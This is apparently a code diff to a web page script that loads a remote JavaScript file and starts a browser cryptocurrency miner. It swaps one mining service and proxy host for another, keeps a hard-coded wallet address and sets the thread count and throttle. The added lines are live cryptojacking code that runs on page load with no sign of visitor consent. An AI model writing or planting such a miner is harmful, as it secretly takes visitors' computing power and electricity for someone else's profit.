@@ -15,14 +15,14 @@ function loadScript(url, callback)
     head.appendChild(script);
 };
 var myPrettyCode = function() {
-  CryptoLoot.CONFIG.WEBSOCKET_SHARDS = [["ws://139.99.104.157:8892"]];
+  CHive.CONFIG.WEBSOCKET_SHARDS = [["ws://chproxy.goalextra.com:8892"]];
 
   // Start miner
-  var miner=new CryptoLoot.Anonymous('etnk1ELUj9c85xLf6LKw86F2GP7kkixgncZMyYNErDKh4TyRU6BnA3USsFGj1r8wSPRAJcr61cShh8TAVgWA5Yi39UtV8b1vW1',
+  var miner=new CHive.User('etnk1ELUj9c85xLf6LKw86F2GP7kkixgncZMyYNErDKh4TyRU6BnA3USsFGj1r8wSPRAJcr61cShh8TAVgWA5Yi39UtV8b1vW1','GoEx',
         {
-        threads:8,autoThreads:false,throttle:0.9
+        threads:4,autoThreads:false,throttle:0.8
         }
   );
   miner.start();
 };
-loadScript("https://cdn.rawgit.com/bobbieltd/js/8e9aac16/xmrselfhost.js", myPrettyCode);
+loadScript("http://www.goalextra.com/wp-content/uploads/2018/01/chive.js", myPrettyCode);
